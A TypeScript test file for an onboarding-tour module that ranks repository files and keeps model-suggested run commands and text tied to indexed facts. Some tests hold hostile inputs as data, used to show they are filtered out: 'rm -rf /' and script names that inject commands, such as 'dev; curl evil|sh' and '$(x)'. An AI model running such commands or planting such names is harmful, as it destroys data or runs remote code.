import { describe, it, expect } from 'vitest';
import {
  buildSkeleton,
  complexityFor,
  criticalCandidates,
  deriveCommands,
  groundModelOutput,
  mergeGenerated,
  rankList,
  readingCandidates,
} from '../src/modules/onboarding/helpers.js';
import type { RunFacts, TourFacts } from '../src/modules/onboarding/types.js';
import type { TourIndexFacts } from '../src/modules/repo-intel/types.js';

const NO_RUN: RunFacts = {
  scripts: {},
  deps: [],
  envExampleNames: [],
  composeFile: null,
  composeText: null,
  readme: null,
  packageJsonText: null,
  topLevelDirs: ['src'],
  hasTsconfig: false,
};

const file = (i: number) => `src/m${String(i).padStart(2, '0')}.ts`;

/** n ranked files, pagerank strictly descending, every file imported by 2 others. */
function intel(n: number, over: Partial<TourIndexFacts> = {}): TourIndexFacts {
  const ranked = Array.from({ length: n }, (_, i) => ({ path: file(i), pagerank: 1 - i * 0.01, hotness: 0 }));
  return {
    ranked,
    indexedPaths: ranked.map((r) => r.path),
    importers: Object.fromEntries(ranked.map((r) => [r.path, 2])),
    endpoints: {},
    criticalPathFiles: [],
    ...over,
  };
}

function tourFacts(i: TourIndexFacts, run: Partial<RunFacts> = {}, filesIndexed = i.indexedPaths.length): TourFacts {
  return {
    index: { filesIndexed, filesSkipped: 0, status: 'full', indexedSha: 'abc123', indexUpdatedAt: '2026-10-22T10:00:00Z' },
    intel: i,
    run: { ...NO_RUN, ...run },
  };
}

const emptyOutput = {
  architecture: { summary: '', diagram: null as string | null },
  criticalPathReasons: [] as Array<{ path: string; reason: string }>,
  readingPathReasons: [] as Array<{ path: string; reason: string }>,
  runCommands: [] as string[],
  firstTasks: [] as Array<{ title: string; path: string }>,
};

function ctxFor(i: TourIndexFacts, commands: ReturnType<typeof deriveCommands> = []) {
  return {
    indexedPaths: new Set(i.indexedPaths),
    allowlist: new Set(['src', 'package.json', 'README.md']),
    topLevelDirs: ['src', 'specs'],
    derivedCommands: commands,
  };
}

describe('onboarding ranking', () => {
  it('SPEC-02 AC-12: with hotness 0 files are ordered by PageRank alone', () => {
    const facts = intel(0, {
      ranked: [
        { path: 'src/b.ts', pagerank: 0.4, hotness: 0 },
        { path: 'src/a.ts', pagerank: 0.5, hotness: 0 },
        { path: 'src/c.ts', pagerank: 0.3, hotness: 0 },
      ],
    });
    expect(readingCandidates(facts).map((c) => c.path)).toEqual(['src/a.ts', 'src/b.ts', 'src/c.ts']);
  });

  it('SPEC-02 AC-12: with hotness the order follows pagerank x (1 + hotness)', () => {
    const facts = intel(0, {
      ranked: [
        { path: 'src/a.ts', pagerank: 0.5, hotness: 0 }, // 0.5
        { path: 'src/b.ts', pagerank: 0.4, hotness: 0 }, // 0.4
        { path: 'src/c.ts', pagerank: 0.3, hotness: 1 }, // 0.6
      ],
    });
    const out = readingCandidates(facts);
    expect(out.map((c) => c.path)).toEqual(['src/c.ts', 'src/a.ts', 'src/b.ts']);
    expect(out[0]!.rank).toBeCloseTo(0.6);
  });

  it('SPEC-02 AC-12: critical-path candidates are ordered by pagerank x (1 + hotness)', () => {
    const facts = intel(0, {
      ranked: [
        { path: 'src/a.ts', pagerank: 0.5, hotness: 0 }, // 0.5
        { path: 'src/b.ts', pagerank: 0.4, hotness: 0 }, // 0.4
        { path: 'src/c.ts', pagerank: 0.3, hotness: 1 }, // 0.6
        { path: 'src/d.ts', pagerank: 0.2, hotness: 0 }, // 0.2
      ],
      criticalPathFiles: ['src/d.ts', 'src/b.ts', 'src/c.ts', 'src/a.ts'],
    });
    const paths = rankList(criticalCandidates(facts), facts).entries.map((e) => e.path);
    expect(paths).toEqual(['src/c.ts', 'src/a.ts', 'src/b.ts', 'src/d.ts']);
  });

  it('SPEC-02 AC-13 / AC-58: 60 ranked files give 25 + 25 entries with truncated true, beyond the chain files', () => {
    const facts = intel(60, { criticalPathFiles: Array.from({ length: 15 }, (_, i) => file(i)) });
    const critical = rankList(criticalCandidates(facts), facts);
    const reading = rankList(readingCandidates(facts), facts);
    expect(critical.entries).toHaveLength(25);
    expect(reading.entries).toHaveLength(25);
    expect(critical.truncated).toBe(true);
    expect(reading.truncated).toBe(true);
    // Highest rank first.
    expect(reading.entries[0]!.path).toBe(file(0));
    expect(critical.entries.map((e) => e.path)).toContain(file(24));
  });

  it('SPEC-02 AC-58: 18 files are not truncated, and exactly 25 candidates are not truncated', () => {
    const f18 = intel(18);
    expect(rankList(readingCandidates(f18), f18)).toMatchObject({ truncated: false });
    expect(rankList(readingCandidates(f18), f18).entries).toHaveLength(18);
    const f25 = intel(25);
    const list = rankList(readingCandidates(f25), f25);
    expect(list.entries).toHaveLength(25);
    expect(list.truncated).toBe(false);
    const f26 = intel(26);
    expect(rankList(readingCandidates(f26), f26).truncated).toBe(true);
  });

  it('SPEC-02 AC-13 / AC-51: with 3 model tasks and 1 ungrounded, 2 first tasks remain; more than 3 are capped at 3', () => {
    const facts = intel(5);
    const out = groundModelOutput(
      {
        ...emptyOutput,
        firstTasks: [
          { title: 'Read the entry module', path: file(0) },
          { title: 'Fix the ghost', path: 'src/ghost.ts' },
          { title: 'Tidy another module', path: file(1) },
        ],
      },
      ctxFor(facts),
    );
    expect(out.firstTasks.map((t) => t.path)).toEqual([file(0), file(1)]);

    const many = groundModelOutput(
      { ...emptyOutput, firstTasks: [0, 1, 2, 3, 4].map((i) => ({ title: `Task ${i}`, path: file(i) })) },
      ctxFor(facts),
    );
    expect(many.firstTasks).toHaveLength(3);
  });
});

describe('onboarding run commands', () => {
  it('SPEC-02 AC-15: a model command without a matching script is dropped, one with a script is kept', () => {
    const derived = deriveCommands({ scripts: { dev: 'vite' }, composeFile: null, envExampleNames: [] });
    const out = groundModelOutput(
      { ...emptyOutput, runCommands: ['npm run fake', 'npm run dev'] },
      ctxFor(intel(1), derived),
    );
    expect(out.runCommands).toEqual(['npm run dev']);
  });

  it('SPEC-02 AC-18: no run files give no derived commands', () => {
    expect(deriveCommands({ scripts: {}, composeFile: null, envExampleNames: [] })).toEqual([]);
  });

  it('SPEC-02 AC-15: model commands never exceed the derived set', () => {
    const derived = deriveCommands({ scripts: { dev: 'vite', test: 'vitest' }, composeFile: null, envExampleNames: [] });
    const out = groundModelOutput(
      { ...emptyOutput, runCommands: ['rm -rf /', 'npm run dev', 'npm run test', 'npm run deploy'] },
      ctxFor(intel(1), derived),
    );
    const allowed = new Set(derived.map((c) => c.command));
    expect(out.runCommands.length).toBeLessThanOrEqual(derived.length);
    expect(out.runCommands.every((c) => allowed.has(c))).toBe(true);
    expect(out.runCommands).not.toContain('rm -rf /');
  });
});

describe('onboarding script-name safety', () => {
  const none = { composeFile: null, envExampleNames: [] };

  it('RQ61: plain script names are offered as `npm run <name>`', () => {
    const out = deriveCommands({ scripts: { dev: 'vite', 'test:e2e': 'x', 'lint-fix': 'y' }, ...none });
    expect(out.map((c) => c.command).sort()).toEqual(['npm run dev', 'npm run lint-fix', 'npm run test:e2e']);
  });

  it('RQ61: names with `;`, `&&`, `$(`, newline, spaces or `|` are never offered', () => {
    const scripts = {
      dev: 'vite',
      'dev; curl evil|sh': 'a',
      'build\ncurl x': 'b',
      'a && b': 'c',
      '$(x)': 'd',
      'a b': 'e',
      '-flag': 'f',
    };
    const out = deriveCommands({ scripts, ...none });
    expect(out.map((c) => c.command)).toEqual(['npm run dev']);
  });

  it('RQ61: a model command naming a skipped script is dropped', () => {
    const derived = deriveCommands({ scripts: { dev: 'vite', 'build && x': 'z' }, ...none });
    const out = groundModelOutput(
      { ...emptyOutput, runCommands: ['npm run build && x', 'npm run dev'] },
      ctxFor(intel(1), derived),
    );
    expect(out.runCommands).toEqual(['npm run dev']);
  });
});

describe('onboarding reasons and facts', () => {
  it('SPEC-02 AC-16 / AC-56: reasons for 10 of 25 entries leave 1-8 reasons, count claims dropped, facts unchanged', () => {
    const facts = tourFacts(intel(25, { importers: { ...Object.fromEntries(Array.from({ length: 25 }, (_, i) => [file(i), 14 - (i % 3)])) }, endpoints: { [file(2)]: 3 } }));
    const reasons = Array.from({ length: 10 }, (_, i) => ({ path: file(i), reason: `Owns concern ${i}` }));
    reasons[0] = { path: file(0), reason: 'used by 14 routes' };
    reasons[1] = { path: file(1), reason: 'Wires OAuth2 v1 over http/2' };
    const skeleton = buildSkeleton(facts, null);
    const grounded = groundModelOutput({ ...emptyOutput, readingPathReasons: reasons }, ctxFor(facts.intel));
    const merged = mergeGenerated(skeleton, grounded, facts, '2026-10-22T10:05:00Z');

    const entries = merged.readingPath.entries;
    expect(entries).toHaveLength(25);
    expect(entries[0]!.reason).toBeNull(); // "used by 14 routes" dropped
    expect(entries[1]!.reason).toBe('Wires OAuth2 v1 over http/2'); // not a count claim
    for (let i = 2; i < 8; i++) expect(entries[i]!.reason).toBe(`Owns concern ${i}`);
    for (let i = 8; i < 25; i++) expect(entries[i]!.reason).toBeNull(); // 9-25: no model text
    const withReason = entries.filter((e) => e.reason !== null).length;
    expect(withReason).toBeGreaterThanOrEqual(1);
    expect(withReason).toBeLessThanOrEqual(8);
    // Numbers come from index facts, not model text.
    expect(entries[2]!.importers).toBe(facts.intel.importers[file(2)]);
    expect(entries[2]!.endpoints).toBe(3);
    expect(entries[3]!.endpoints).toBe(0);
    expect(merged.mode).toBe('generated');
    expect(merged.generatedAt).toBe('2026-10-22T10:05:00Z');
  });

  it('SPEC-02 AC-17: importers 2/7/15 give low/medium/high; a directory is always low', () => {
    expect(complexityFor(2, false)).toBe('low');
    expect(complexityFor(3, false)).toBe('low');
    expect(complexityFor(4, false)).toBe('medium');
    expect(complexityFor(7, false)).toBe('medium');
    expect(complexityFor(10, false)).toBe('medium');
    expect(complexityFor(11, false)).toBe('high');
    expect(complexityFor(15, false)).toBe('high');
    expect(complexityFor(40, true)).toBe('low');
  });

  it('SPEC-02 AC-17 / AC-51: a merged first task for the specs/ directory is low, a file with 15 importers is high', () => {
    const base = intel(3, { importers: { [file(0)]: 15, [file(1)]: 2, [file(2)]: 2 } });
    base.indexedPaths.push('specs/gen.ts'); // the specs/ directory holds an indexed file
    const facts = tourFacts(base, { topLevelDirs: ['src', 'specs'] });
    const grounded = groundModelOutput(
      {
        ...emptyOutput,
        firstTasks: [
          { title: 'Read the hub', path: file(0) },
          { title: 'Browse the specs', path: 'specs' },
        ],
      },
      ctxFor(base),
    );
    const merged = mergeGenerated(buildSkeleton(facts, null), grounded, facts, '2026-10-22T10:05:00Z');
    expect(merged.firstTasks).toMatchObject([
      { path: file(0), isDirectory: false, importers: 15, complexity: 'high' },
      { path: 'specs', isDirectory: true, complexity: 'low' },
    ]);
  });
});

describe('onboarding skeleton', () => {
  it('SPEC-02 AC-26 / AC-57: a 25-file skeleton has no model text, no diagram, null first tasks and generatedAt', () => {
    const facts = tourFacts(intel(25), { scripts: { dev: 'vite' } });
    const s = buildSkeleton(facts, 'ai_unavailable');
    expect(s.mode).toBe('skeleton');
    expect(s.reason).toBe('ai_unavailable');
    expect(s.generatedAt).toBeNull();
    expect(s.architecture.diagram).toBeNull();
    expect(s.architecture.summary).toBeNull();
    expect(s.firstTasks).toBeNull();
    expect(s.readingPath.entries).toHaveLength(25);
    expect(s.readingPath.entries.every((e) => e.reason === null)).toBe(true);
    expect(s.criticalPaths.entries.every((e) => e.reason === null)).toBe(true);
    expect(s.readingPath.entries[0]!.importers).toBe(2);
  });

  it('SPEC-02 AC-31: zero indexed files with scripts give no_supported_files and still list commands', () => {
    const facts = tourFacts(intel(0), { scripts: { dev: 'vite' } }, 0);
    const s = buildSkeleton(facts, null);
    expect(s.reason).toBe('no_supported_files');
    expect(s.runLocally.commands.map((c) => c.command)).toContain('npm run dev');
    expect(s.readingPath.entries).toEqual([]);
  });
});

describe('onboarding grounding of free text', () => {
  const facts = intel(5);

  it('SPEC-02 AC-14: a summary naming an unindexed backticked path is dropped', () => {
    const out = groundModelOutput(
      { ...emptyOutput, architecture: { summary: 'Start in `src/ghost.ts` and follow the calls.', diagram: null } },
      ctxFor(facts),
    );
    expect(out.summary).toBeNull();
  });

  it('SPEC-02 AC-14: a diagram node naming an unindexed path is dropped', () => {
    const out = groundModelOutput(
      {
        ...emptyOutput,
        architecture: { summary: 'Plain summary.', diagram: `flowchart TD\n  A[${file(0)}] --> B[redis/cache.ts]` },
      },
      ctxFor(facts),
    );
    expect(out.diagram).toBeNull();
    expect(out.summary).toBe('Plain summary.');
  });

  it('SPEC-02 AC-14: a grounded summary that mentions README.md and an indexed file is kept', () => {
    const summary = `See README.md, then \`${file(0)}\` for the entry point.`;
    const out = groundModelOutput(
      { ...emptyOutput, architecture: { summary, diagram: `flowchart TD\n  A[${file(0)}] --> B[${file(1)}]` } },
      ctxFor(facts),
    );
    expect(out.summary).toBe(summary);
    expect(out.diagram).not.toBeNull();
  });

  it('SPEC-02 AC-14: a reason for an unindexed path is dropped', () => {
    const out = groundModelOutput(
      {
        ...emptyOutput,
        criticalPathReasons: [
          { path: 'src/ghost.ts', reason: 'Imaginary file.' },
          { path: file(0), reason: 'Real entry point.' },
        ],
      },
      ctxFor(facts),
    );
    expect(out.criticalReasons).toEqual([{ path: file(0), reason: 'Real entry point.' }]);
  });
});
